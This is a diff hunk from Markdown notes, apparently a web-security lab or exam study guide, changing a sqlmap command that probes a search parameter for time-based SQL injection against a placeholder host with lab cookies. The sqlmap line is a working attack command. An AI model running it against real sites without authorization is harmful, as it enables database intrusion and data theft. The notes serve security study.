@@ -1740,13 +1740,13 @@ sqlmap -u 'https://TARGET.net/filtered_search?SearchTerm=x&sort-by=DATE&writer='
 
 ![SQLMAP used to dump data from tables](images/sqlmap-dump-table-data.png)  
 
->This is also a good sequence of SQLMAP commands to identify and extract data from a sensitive error based time delay SQL injection in advance search filters.  
+>This is also a good start with SQLMAP to identify and extract data from a sensitive error based time delay SQL injection in advance search filters.  
 
 ```
-sqlmap -v -u 'https://TARGET.NET/ADVsearch?term=x&organizeby=DATE&journalist=&cachebust=1656138093.57' -p "term" --batch --cookie="_lab=YESYESYESYES; session=YESYESYESYES" --random-agent --level=2 --risk=2
+sqlmap -v -u 'https://TARGET.NET/search?term=x&organizeby=DATE&journalist=&cachebust=1656138093.57' -p "term" --batch --cookie="_lab=YESYESYESYES; session=YESYESYESYES" --random-agent --level=2 --risk=2
 ```  
 
-
+![sqlmap 1.7.2 stable](images/2023-03-21_18-20_1.png)
 
 [SQLMAP Help usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)  
 
